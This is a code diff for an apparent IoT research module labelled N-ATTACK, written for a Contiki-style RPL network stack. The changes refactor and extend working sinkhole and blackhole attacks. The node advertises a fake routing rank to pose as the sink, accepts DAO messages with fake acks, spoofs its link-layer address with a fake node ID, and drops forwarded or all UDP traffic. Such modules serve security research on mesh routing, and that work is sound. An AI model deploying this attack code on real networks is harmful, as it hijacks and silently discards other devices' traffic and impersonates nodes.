@@ -45,10 +45,94 @@
 #define LOG_MODULE "N-ATTACK"
 #define LOG_LEVEL LOG_LEVEL_INFO
 
-bool network_attacks_sink_hole = false;
-bool network_attacks_sink_hole_fake_dao = true;
-bool network_attacks_drop_fwd_udp = false;
-uint16_t network_attacks_fake_rank = 128;
+/*
+ * Configuration for sink hole attack:
+ * (a) Send fake rank in DIO that the attacking node is the sink node:
+ *   network_attacks_rpl_dio_fake_rank = 128
+ * (b) Send fake rank in DIO that the attacking node is close to sink:
+ *   network_attacks_rpl_dio_fake_rank = 256
+ * Immediately reply to DAO with fake DAO ack unconditional accept
+ *   network_attacks_rpl_dao_fake_accept = true
+ * Ignore DIO from all but parent to avoid switching to tricked children:
+ *   network_attacks_rpl_dio_only_parent = true
+ *
+ * Configuration for black hole attack: sink hole attack plus following:
+ * (a) Drop ALL application (UDP) packets forwarded via node.
+ *   network_attacks_udp_drop_fwd = true
+ * (b) Drop ALL application (UDP) packets (including from this node)
+ *   network_attacks_udp_drop = true
+ */
+
+/*
+ * Drop any forwarded UDP packets. Application packets are sent using
+ * UDP, routing control packets via ICMP6.
+ */
+bool network_attacks_udp_drop_fwd = false;
+
+/*
+ * Drop all outgoing UDP packets. Application packets are sent using
+ * UDP, routing control packets via ICMP6.
+ */
+bool network_attacks_udp_drop = false;
+
+/*
+ * Send fake rate in DIO packets when different from 0.
+ */
+uint16_t network_attacks_rpl_dio_fake_rank = 0;
+
+/*
+ * Only accept DIO from parent, ignore DIO from all other neighbors.
+ */
+bool network_attacks_rpl_dio_only_parent = false;
+
+/*
+ * Reply to DAO with fake DAO ack with unconditional accept.
+ */
+bool network_attacks_rpl_dao_fake_accept = false;
+
+/*
+ * Use a fake node id as for node lladdr. Set to 0 for normal node id.
+ */
+uint16_t network_attacks_fake_id = 0;
+
+static uint16_t current_fake_id = 0;
+static linkaddr_t original_address;
+static struct ctimer periodic_timer;
+/*---------------------------------------------------------------------------*/
+static void
+set_fake_id(uint16_t fake_id)
+{
+  current_fake_id = fake_id;
+
+  if(fake_id == 0) {
+    /* Restore normal address */
+    linkaddr_set_node_addr(&original_address);
+    LOG_INFO("Restored original address: ");
+  } else {
+    linkaddr_t fladdr;
+    memset(&fladdr, 0, sizeof(linkaddr_t));
+    for(int i = 0; i < sizeof(uip_lladdr.addr); i += 2) {
+      fladdr.u8[i + 1] = fake_id & 0xff;
+      fladdr.u8[i + 0] = fake_id >> 8;
+    }
+    linkaddr_set_node_addr(&fladdr);
+
+    LOG_INFO("Fake node address: ");
+  }
+  LOG_INFO_LLADDR(&linkaddr_node_addr);
+  LOG_INFO_(")\n");
+  memcpy(&uip_lladdr.addr, &linkaddr_node_addr, sizeof(uip_lladdr.addr));
+}
+/*---------------------------------------------------------------------------*/
+static void
+check_config(void *ptr)
+{
+  if(current_fake_id != network_attacks_fake_id) {
+    set_fake_id(network_attacks_fake_id);
+  }
+
+  ctimer_restart(&periodic_timer);
+}
 /*---------------------------------------------------------------------------*/
 static bool
 is_parent(const uip_ipaddr_t *addr, uint8_t instance_id, bool compare_mac)
@@ -119,7 +203,7 @@ process_dio_input(struct uip_icmp_hdr *hdr)
     /* Unicast */
   }
 
-  if(network_attacks_sink_hole) {
+  if(network_attacks_rpl_dio_only_parent) {
     uint8_t *payload = (uint8_t *)(hdr + 1);
     if(is_parent(&UIP_IP_BUF->srcipaddr, payload[0], false)) {
       LOG_INFO("allowing DIO from parent ");
@@ -140,7 +224,7 @@ static enum netstack_ip_action
 process_dao_input(struct uip_icmp_hdr *hdr)
 {
 #if ROUTING_CONF_RPL_LITE
-  if(network_attacks_sink_hole && network_attacks_sink_hole_fake_dao) {
+  if(network_attacks_rpl_dao_fake_accept) {
     uint8_t *payload = (uint8_t *)(hdr + 1);
     if(is_parent(&UIP_IP_BUF->srcipaddr, payload[0], true)) {
       LOG_INFO("drop DAO from parent ");
@@ -226,8 +310,8 @@ process_dio_output(struct uip_icmp_hdr *hdr)
     /* Unicast */
   }
 
-  if(network_attacks_sink_hole) {
-    uint16_t new_rank = network_attacks_fake_rank;
+  if(network_attacks_rpl_dio_fake_rank != 0) {
+    uint16_t new_rank = network_attacks_rpl_dio_fake_rank;
     payload = (uint8_t *)(hdr + 1);
     LOG_INFO("sending fake DIO: i: %u ver: %u rank: %u => rank: %u\n",
              payload[0], payload[1],
@@ -290,7 +374,14 @@ ip_output(const linkaddr_t *localdest)
     }
   }
 
-  if(!is_from_me && network_attacks_drop_fwd_udp && proto == UIP_PROTO_UDP) {
+  if(network_attacks_udp_drop && proto == UIP_PROTO_UDP) {
+    LOG_INFO("Dropping UDP from ");
+    LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
+    LOG_INFO_("\n");
+    return NETSTACK_IP_DROP;
+  }
+
+  if(network_attacks_udp_drop_fwd && !is_from_me && proto == UIP_PROTO_UDP) {
     LOG_INFO("Dropping UDP forwarded from ");
     LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
     LOG_INFO_("\n");
@@ -310,5 +401,10 @@ network_attacks_init(void)
 {
   /* Register packet processor */
   netstack_ip_packet_processor_add(&packet_processor);
+
+  /* Store original address */
+  linkaddr_copy(&original_address, &linkaddr_node_addr);
+
+  ctimer_set(&periodic_timer, CLOCK_SECOND / 2, check_config, NULL);
 }
 /*---------------------------------------------------------------------------*/
